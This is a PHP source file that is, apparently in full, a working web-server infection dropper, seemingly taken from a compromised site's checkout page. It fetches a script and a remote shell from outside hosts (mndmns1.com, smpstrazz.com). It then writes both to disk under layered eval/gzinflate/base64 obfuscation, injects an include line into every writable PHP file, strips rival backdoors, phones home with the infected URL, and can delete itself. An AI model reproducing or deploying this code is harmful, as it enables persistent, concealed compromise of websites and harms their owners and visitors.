<?php 

if(!function_exists('dg_main_init')){ 

function dg_main_init(){ 
	$ver = "4.0"; 
	set_time_limit(1800); 
	$GLOBALS['dg_pu'] = "{$GLOBALS['http']}mndmns1.com/?update=js&host={$_SERVER['HTTP_HOST']}"; 
	$GLOBALS['dg_eu'] = "{$GLOBALS['http']}mndmns1.com/?update=shl&host={$_SERVER['HTTP_HOST']}"; 
	$GLOBALS['dgin'] = "style.css.php"; 
	$GLOBALS['dgsf'] = "s.php"; 
	$GLOBALS['dgfn'] = ""; 
	echo"<b color='green'>exploit full path [{$_SERVER['SCRIPT_FILENAME']}]</b><br />[s1]<br />"; 
	echo"<b color='green'>bomb full path [{$GLOBALS['bobmfn']}]</b><br />"; 
	echo"{$ver}<h2>{$GLOBALS['http']}{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}</h2>"; 
	$path = explode("/", $_SERVER['SCRIPT_FILENAME']); 
	array_pop($path); 
	$GLOBALS['fpath'] = implode("/", $path) . '/'; 
	$uri = explode("/", $_SERVER['REQUEST_URI']); 
	$uri = array_slice($uri, 0, count($uri) - 1); 
	while(count($uri) > 0 && count($path) > 0 && strtolower($uri[count($uri) - 1]) == strtolower($path[count($path) - 1]))
	{ 
		unset($uri[count($uri) - 1]); 
		unset($path[count($path) - 1]); 
	} 
	$GLOBALS['dgsp'] = implode("/", $path); 
	echo"<b color='green'>root dir path [{$GLOBALS['dgsp']}/]</b><br /><br />"; 
	$GLOBALS['dgcgr'] = 0; 
	$GLOBALS['dgcgrf'] = 0; 
	$my_uid = getmyuid(); 
	$my_gid = getmygid(); 
	$my_cid = get_current_user(); 
	echo"SYSTEM: " . `uname -a` . "<br />"; 
	if(ini_get('safe_mode')){
		echo "<h1 color='red'>SAFE MODE</h1>";
	} 
	
	echo "MY USER ID: {$my_uid}; MY GROUP ID: $my_gid; CURRENT USER: {$my_cid}<br />"; 
	dg_main_exec();
	} 
} 

if(!function_exists('phpinj')){ 
	function phpinj($folder, $inj = 0, $silent = true){ 
	$our_folder = 0; 
	$folder = str_replace('\\', '/', $folder); 
	if($folder[strlen($folder) - 1] == '/'){ 
		$folder = substr($folder, 0, strlen($folder) - 1); 
	}
	if(!is_dir($folder)){ 
		if(!$silent){
			echo"<b>NOT FOLDER</b> <font color='red'>{$folder}</font><br />";
		} 
		return;
	} 
	if(is_link($folder)){ 
		if(!$silent){
			echo"<b>LINK</b> <font color='red'>{$folder}</font><br />";
		} 
		return;
	} 
	if(strpos(strtolower($folder), 'cache') || strpos(strtolower($folder), 'snapshot')){ 
		if(!$silent){echo"<b>CACHE</b> <b color='orange'>{$folder}</b><br />";
		} 
		return;
	} 
	if($folder . "/" == $GLOBALS['dgcp'] || file_exists($folder . '/' . $GLOBALS['dgin'])){ if(!$silent){echo"<b>MAIN DIR</b> <font color='red'>{$folder}</font><br />
";} return; } if(!$silent){echo"{$folder}<br />
";} $h = opendir($folder); if(!$h){ if(!$silent){echo"<b>OPENDIR</b> <font color='red'>{$folder}</font><br />
";} return; } $dirs = array(); while(strlen($f = readdir($h))){ if($f == '.' || $f == '..'){ continue; } $pc = 0; $lc = ""; $lp = ""; $fh = false; $file = $folder . '/' . $f; if(is_file($file)){ $mfn = substr(md5($folder . '/'), 0, 3) . '.php'; $sfn = substr(md5($mfn), 0, 4) . '.php'; $mkr = md5($file); if($f == $mfn){ if(!$silent){echo"<b>OTHER MS</b> <font color='red'>{$file}</font><br />
";} continue; } if($f == $sfn){ if(!$silent){echo"<b>SHELL</b> <font color='red'>{$file}</font><br />
";} continue; } if(isset($GLOBALS['dgmn']) && $f == $GLOBALS['dgmn']){ if(!$silent){echo"<b>SELF</b>
<h4>{$file}</h4>
";} continue; } if(!in_array(strtolower(gfe($file)), array("php","phtml","php3","php4","php5"))){ continue; } if(!is_writable($file)){ if(!$silent){echo"<font color='red'>{$file}</font><br />
";} continue; } $lc = " <b>[not patched]</b>"; $fa = file($file); $dif_path = false; $count = count($fa); for($i = 0; $i < $count; $i++){ if(strpos($fa[$i], 'base64_decode') > 0 && strpos($fa[$i], 'eval') > 0){ if(preg_match('/\<\?php\s+\/\*(\w{32})\*\/\s/si', $fa[$i], $_r)){ if($_r[1] == '00000000000000000000000000000000'){ if(!$silent){echo"<b>BOMB</b> <font color='blue'>{$file}</font><br />
";} unset($fa[$i]); }elseif($_r[1] == $mkr){ $lc = " <b>[cleared]</b>"; unset($fa[$i]); }elseif($_r[1] <> $mkr){ $dif_path = true; $lc = " <b>[other script]</b>"; break; } }elseif(strpos($fa[$i], '/**/') > 0){ $dif_path = true; $lc = " <b>[other script]</b>"; }else{ $lc = " <b>[alien shell] [m2]</b>"; unset($fa[$i]); } }else{ break; } } if($dif_path){ if(!$silent){echo"<b>DIF PATH</b> {$file}<br />
\n";} continue; } $nc = implode("", $fa); if(preg_match("/\<\?(\w{3})?[^\>]*eval\s*\(\s*g?z?i?n?f?l?a?t?e?\s*\(?\s*base64_decode[^\>]*\?\>/siU", $nc)){ echo"
<h1 color='red'>[alien shell] [m2]</h1>
"; $nc = preg_replace("/\<\?(\w{3})?[^\>]*eval\s*\(\s*g?z?i?n?f?l?a?t?e?\s*\(?\s*base64_decode[^\>]*\?\>/siU", "", $nc); } if(preg_match("/\@zend/i", $nc)){ if(!$silent){echo"<b>ZEND</b> <font color='red'>{$file}</font>{$lc}<br />
";} continue; }elseif($inj){ $inject = prepare_pack("
<?php /*" . generate_string(50) . "*/ " . $GLOBALS['dgij'] . " ?>
", rand(20, 30), 0, 1); $inject = str_replace("
<?php", "<?php /*{$mkr}*/", $inject); $nc = $inject . "\n" . $nc; $lp = " <b>[patched]</b>"; } if(save_text_to_file($file, $nc, 1)){ echo"<font color='green'>{$file}{$lc}{$lp}</font><br />"; }else{ echo"<font color='red'>{$file}{$lc}{$lp}</font><br />"; } }elseif(is_dir($file)){ $dirs[$file] = count($dirs) + 1; } } closedir($h); } } if(!function_exists('leave_clear_php')){ function leave_clear_php(&$txt){ $txt = substr($txt, strpos($txt, '<?'), strlen($txt)); $txt = substr($txt, 0, strrpos($txt, '?>
') + 2); } } if(!function_exists('dgdownload')){ function dgdownload($url, $connect_timeout){ if(!$url){return '';} $ret = ''; $url_info = parse_url($url); if(!isset($url_info['port']) || !$url_info['port']){ $url_info['port'] = 80; } if(!isset($url_info['path']) || !$url_info['path']){ $url_info['path'] = '/'; } if(isset($url_info['query']) && $url_info['query']){ $url_info['path'] = $url_info['path'] . "?" . $url_info['query']; } $query = "GET {$url_info['path']} HTTP/1.1\r\n"; $query .= "Host: {$url_info['host']}\r\n"; $query .= "Accept: */*\r\n"; $query .= "Connection: close\r\n"; $query .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12\r\n"; $query = $query . "\r\n"; $errno = 0; $error = ""; $sock = fsockopen($url_info['host'], $url_info['port'], $errno, $error, $connect_timeout); $h = array(); $resp = array(); if($sock){ stream_set_timeout($sock, $connect_timeout); fwrite($sock, $query); $hd = false; while(!feof($sock)){ $l = fgets($sock); if(!$hd){ if(trim($l) == ''){ $hd = true; }else{ $h[] = $l; } }else{ $resp[] = $l; } } fclose($sock); } $ret = implode("", $resp); return $ret; } } if(!function_exists('save_text_to_file')){ function save_text_to_file($fn, $t, $r = 0){ if($r){ $f = fopen($fn, "w"); }else{ $f = fopen($fn, "a"); } if($f){ fwrite($f, $t); fflush($f); fclose($f); $fs = filesize($fn); if(($t <> '' && $fs) || ($t == '' && !$fs)){ return 1; }else{ $fn = str_replace("/", "\\", $fn); $fs = filesize($fn); } if(($t <> '' && $fs) || ($t == '' && !$fs)){ return 1; } }else{ return 0; } } } if(!function_exists('replace_substring')){ function replace_substring(&$text, $pret, $postt, $str){ $pos = strpos($text, $pret); if(!$pos){return false;} $pre = substr($text, 0, $pos + strlen($pret)); $pos = strpos($text, $postt, $pos); if(!$pos){return false;} $post = substr($text, $pos, strlen($text)); if(strlen($pre) && strlen($post)){ $text = $pre.$str.$post; return true; } return false; } } if(!function_exists('gfe')){ function gfe($fn){ $ret = pathinfo($fn); if(isset($ret['extension'])){ return $ret['extension']; }else{ return ""; } } } if(!function_exists('prepare_pack')){ function prepare_pack($php, $cycles = 0, $split_by_functions = 0, $zip = 0){ if(!function_exists('base64_encode')){ return $php; } $ret = preg_replace("/^[^\s]+[\s]/U", "", $php); $ret = preg_replace("/[\s][^\s]+\Z/", "", $ret); $ret = trim($ret); if($split_by_functions){ $tmp = preg_split('/\}\s+function/', $ret); }else{ $tmp[] = $ret; } $skip_first = false; if(count($tmp)){ $pos = strpos($tmp[0], 'function'); if($pos === 0){ $tmp[0] = substr($tmp[0], strlen('function'), strlen($tmp[0])); }else{ $skip_first = true; } $ret = ''; $count = 0; $total = count($tmp); foreach($tmp as $key=>$val){ $val = preg_replace("/\s+/", " ", $val); $count++; $count == $total ? $add = '' : $add = '}'; if($total > 1 && !($count == 1 && $skip_first)){ $next_encoded = '/*' . generate_string(50) . '*/ ' . 'function ' . trim($val) . $add; }else{ $next_encoded = trim($val).$add; } if($zip && function_exists('gzdeflate')){ $next_encoded = gzdeflate($next_encoded, 9); } $next_encoded = base64_encode($next_encoded); if($zip && function_exists('gzdeflate')){ $ret .= "eval(gzinflate(base64_decode('{$next_encoded}')));"; }else{ $ret .= "eval(base64_decode('{$next_encoded}'));"; } } for($i = 0; $i < $cycles; $i++){ if($zip && function_exists('gzdeflate')){ $ret = gzdeflate($ret, 9); } $ret = base64_encode($ret); if($zip && function_exists('gzdeflate')){ $ret = "eval(gzinflate(base64_decode('{$ret}')));"; }else{ $ret = "eval(base64_decode('{$ret}'));"; } } $ret = "<"."?php $ret?".">"; } return $ret; } } if(!function_exists('generate_string')){ function generate_string($len = 4){ $ret = ''; $arr = array('q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m'); for($i = 0; $i < $len; $i++){ $ret .= $arr[rand(0, count($arr) - 1)]; } return $ret; } } if(!function_exists('kill_self')){ function kill_self(){ if(file_exists($GLOBALS['bobmfn'])){ $nc = implode("", file($GLOBALS['bobmfn'])); $nc = preg_replace("/\<\?(\w{3})?[^\>]*00000000000[^\>]*eval\s*\(\s*g?z?i?n?f?l?a?t?e?\s*\(?\s*base64_decode[^\>]*\?\>\s*(\S)/siU", "$2", $nc); if(save_text_to_file($GLOBALS['bobmfn'], $nc, 1)){ echo"<b color='green'>self killed</b><br />
[s8]<br />
"; }else{ echo"<b color='red'>self not killed</b><br />
[e10]<br />
"; } }else{ echo"<b color='red'>self not found</b><br />
[e11]<br />
"; } } } if(isset($_GET['kill_self']) || isset($_POST['kill_self'])){kill_self();} if(!function_exists('search_writable_dirs')){ function search_writable_dirs($folder, &$madrs){ $folder = str_replace('\\', '/', $folder); if(count($madrs) > 300){ return; } if(isset($GLOBALS['dgbc'][$folder . "\n"])){ echo"<b>CHECKED</b> <font color='yellow'>{$folder}</font><br />
"; return; } if(!file_exists($folder)){ echo"<b>NOT EXISTS</b> <font color='red'>{$folder}</font><br />
"; return; } if(strpos(strtolower($folder), 'cache') || strpos(strtolower($folder), 'snapshot')){ echo"<b>CACHE</b> <font color='orange'>{$folder}</font><br />
"; return; } $h = opendir($folder); if(!$h){ return; } if(is_writable($folder)){ $fn = substr(md5($folder . '/'), 0, 3) . '.php'; if(file_exists($folder . '/' . $fn)){ echo"<b>OLD SCRIPT</b> <b color='red'>{$folder}/{$fn}</b><br />
[m1]<br />
"; return; } $madrs[$folder] = count($madrs) + 1; } while(($f = readdir($h)) !== FALSE){ if($f == '.' || $f == '..' || $f == '/' || $f == '\\'){ continue; } if($folder == '/'){ $folder = ''; } if(is_dir($folder . '/' . $f)){ if(is_link($folder . '/' . $f)){ continue; } if(strpos($folder . '/' . $f . '/', $GLOBALS['dgsp']) === false){ echo"<b color='red'>SKIP: {$folder}/{$f}</b><br />
"; continue; } search_writable_dirs($folder . '/' . $f, $madrs); } } closedir($h); flush(); } } if(!function_exists('dg_main_exec')){ function dg_main_exec(){ global $_SERVER; echo"
<hr />
<div align='left'><br clear='all'>
  "; flush(); $fn = 'license.txt'; $ddrs = array(); $a = false; $GLOBALS['dgcp'] = ''; if(file_exists($GLOBALS['dgsp'] . '/' . $fn)){ $GLOBALS['dgcp'] = implode("", file($GLOBALS['dgsp'] . '/' . $fn)); $GLOBALS['dgcp'] = base64_decode($GLOBALS['dgcp']); for($i = 0; $i < 100; $i++){ $GLOBALS['dgcp'] = gzinflate($GLOBALS['dgcp']); } if(file_exists($GLOBALS['dgcp'])){ echo"inspath loaded [{$GLOBALS['dgcp']}] [s7]<br />
  "; }else{ $GLOBALS['dgcp'] = ""; echo"inspath not loaded<br />
  "; } } if(!$GLOBALS['dgcp']){ echo"
  <h3>LOOKING FOR THE LONGEST PATH AT {$GLOBALS['dgsp']}</h3>
  <small>"; search_writable_dirs($GLOBALS['dgsp'], $ddrs, $a); echo"</small>";flush(); $max = 0; foreach($ddrs as $key=>$val){ $fldr = explode('/', $key); $c = count($fldr); if($max < $c){ $max = $c; $GLOBALS['dgcp'] = implode('/', $fldr); } } if(!$GLOBALS['dgcp']){ echo"<b color='red'>nowhere to write anything</b><br />
  [e4]"; kill_self(); die; } if($GLOBALS['dgsp'] == $GLOBALS['dgcp']){ echo"<b color='red'>can't write to the document root</b><br />
  [e5]"; kill_self(); die; } $GLOBALS['dgcp'] = str_replace('\\', '/', $GLOBALS['dgcp']); $GLOBALS['dgcp'] .= '/'; $GLOBALS['dgsp'] .= '/'; echo"the longest available path: <b>{$GLOBALS['dgcp']}</b><br />
  "; $save_path = $GLOBALS['dgcp']; for($i = 0; $i < 100; $i++){ $save_path = gzdeflate($save_path, 9); } $save_path = base64_encode($save_path); if(save_text_to_file($GLOBALS['dgsp'] . '/' . $fn, $save_path, 1)){ echo"<b color='green'>inspath saved [{$GLOBALS['dgsp']}/{$fn}]</b><br />
  [s6]<br />
  "; }else{ echo"<b color='red'>shell save failed [{$GLOBALS['dgsp']}/{$fn}]</b><br />
  "; } } $GLOBALS['dgin'] = substr(md5($GLOBALS['dgcp']), 0, 3) . '.php'; if(!file_exists($GLOBALS['dgcp'] . $GLOBALS['dgin'])){ $pms = dgdownload($GLOBALS['dg_pu'], 60); if($pms){ echo"<b color='green'>{$GLOBALS['dg_pu']} [size: " . strlen($pms) . "]</b><br />
  [s2]<br />
  "; leave_clear_php($pms); }else{ die("<b color='red'>{$GLOBALS['dg_pu']}</b><br />
  [e2]<br />
  "); } echo"full script path: {$GLOBALS['dgcp']}{$GLOBALS['dgin']}<br />
  "; if(!replace_substring($pms, '$GLOBALS[\'dgcp\'] = "', '";', $GLOBALS['dgcp'])){ die("<b color='red'>failed to set path</b><br />
  [e6]"); } echo"<b color='green'>path of main script successfully set [{$GLOBALS['dgcp']}]</b><br />
  "; if(!replace_substring($pms, '$GLOBALS[\'dgin\'] = "', '";', $GLOBALS['dgin'])){ die("<b color='red'>failed to set name</b><br />
  [e7]"); } echo"<b color='green'>name of main script successfully set [{$GLOBALS['dgin']}]</b><br />
  "; if(!replace_substring($pms, '$GLOBALS[\'dgsp\'] = "', '";', $GLOBALS['dgsp'])){ die("<b color='red'>failed to set relative root dir</b><br />
  [e8]"); } echo"<b color='green'>relative root dir successfully set [{$GLOBALS['dgsp']}]</b><br />
  "; $packed_js = prepare_pack($pms, rand(20, 30), 1, 1); if(save_text_to_file($GLOBALS['dgcp'] . $GLOBALS['dgin'], $packed_js, 1)){ echo"<b color='green'>main script saved [{$GLOBALS['dgcp']}{$GLOBALS['dgin']}]</b><br />
  [s4]<br />url
  "; }else{ echo"<b color='red'>main script save failed [{$GLOBALS['dgcp']}{$GLOBALS['dgin']}]</b><br />
  [e9]<br />
  "; kill_self(); die; } }else{ echo"<b color='green'>main script saved [{$GLOBALS['dgcp']}{$GLOBALS['dgin']}]</b><br />
  [s4]<br />
  "; } $GLOBALS['dgsf'] = substr(md5($GLOBALS['dgin']), 0, 4) . '.php'; if(!file_exists($GLOBALS['dgcp'] . $GLOBALS['dgsf'])){ $shl = dgdownload($GLOBALS['dg_eu'], 60); if($shl){ echo"<b color='green'>{$GLOBALS['dg_eu']} [size: " . strlen($shl) . "]</b><br />
  [s3]<br />
  "; leave_clear_php($shl); }else{ echo"<b color='red'>{$GLOBALS['dg_eu']}</b><br />
  [e3]<br />
  "; } $shl = preg_replace("/^[^\s]+[\s]/U", "", $shl); $shl = preg_replace("/[\s][^\s]+\Z/", "", $shl); $shl = '/*' . generate_string(200) . '*/ ' . $shl . ' /*' . generate_string(200) . '*/ '; $packed_js = prepare_pack('
  <?php ' . $shl . ' ?>
  ', rand(40, 60), 0, 1); if(save_text_to_file($GLOBALS['dgcp'] . $GLOBALS['dgsf'], $packed_js, 1)){ echo"<b color='green'>shell saved [{$GLOBALS['dgcp']}{$GLOBALS['dgsf']}]</b><br />
  [s5]<br />
  "; }else{ echo"<b color='red'>shell save failed [{$GLOBALS['dgcp']}{$GLOBALS['dgsf']}]</b><br />
  "; } } $GLOBALS['dgij'] = "if(function_exists('ob_start')&&!isset(\$GLOBALS['mfsn'])){\$GLOBALS['mfsn']='{$GLOBALS['dgcp']}{$GLOBALS['dgin']}';if(file_exists(\$GLOBALS['mfsn'])){include_once(\$GLOBALS['mfsn']);if(function_exists('gml')&&function_exists('dgobh')){ob_start('dgobh');}}}"; echo"<small>"; echo"
  <h3>INJECTING PHP FILES</h3>
  "; $tmp = explode("/", $GLOBALS['fpath']); while(count($tmp) > 0){ array_pop($tmp); $path = implode("/", $tmp); if(strlen($path . '/') < strlen($GLOBALS['dgsp'])){ break; } phpinj($path, 1, 0); } if($GLOBALS['dgmn'] && file_exists($GLOBALS['dgmn'])){ unlink($GLOBALS['dgmn']); } echo"</small>
  <hr />
  <b>dgok</b></div>
"; } } if(!isset($GLOBALS['dgbaw'])){ $GLOBALS['dgbaw'] = 1; if(isset($_GET['dgphpinfo'])){phpinfo();die;} $GLOBALS['http'] = 'http:/'.'/'; $GLOBALS['dgmn'] = ""; $GLOBALS['bobmfn'] = "/home/razorit/razorit.com/checkout/index.php"; if(isset($_GET['dgd']) || isset($_POST['dgd'])){ error_reporting(E_ALL); }else{ error_reporting(0); } if($GLOBALS['dgmn'] && (!strpos($_SERVER['SCRIPT_FILENAME'], $GLOBALS['dgmn'])) || !file_exists($_SERVER['SCRIPT_FILENAME'])){ if(file_exists($_SERVER['PATH_TRANSLATED'])){ $_SERVER['SCRIPT_FILENAME'] = $_SERVER['PATH_TRANSLATED']; }else{ echo"<b color='red'>can't detect exploit full path [{$_SERVER['SCRIPT_FILENAME']}]</b><br />
[e1]"; kill_self(); die; } } $_SERVER['SCRIPT_FILENAME'] = str_replace('\\', '/', $_SERVER['SCRIPT_FILENAME']); $_SERVER['SCRIPT_FILENAME'] = preg_replace("/\/+/", "/", $_SERVER['SCRIPT_FILENAME']); if(isset($_GET['dginit']) || isset($_POST['dginit'])){ dg_main_init(); kill_self(); die; }else{ $cburl = "http://smpstrazz.com/"; $url2 = ""; if($_SERVER['SCRIPT_FILENAME'] <> $GLOBALS['bobmfn'] && strpos(' ' . $GLOBALS['bobmfn'], $GLOBALS['dgsp']) == 1){ $url2 = $GLOBALS['http'] . $_SERVER['HTTP_HOST'] . "/" . substr($GLOBALS['bobmfn'], strlen($GLOBALS['dgsp']), strlen($GLOBALS['bobmfn'])); } $cburl .= "?url=" . rawurlencode($GLOBALS['http'] . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']); if($url2){ $cburl .= "&url2=" . rawurlencode($url2); } $ok = dgdownload($cburl, 10); } } 










	$my_uid = getmyuid(); 
	$my_gid = getmygid(); 
	$my_cid = get_current_user(); 
	echo $my_uid;
	echo $my_gid;
	echo $my_cid;


?>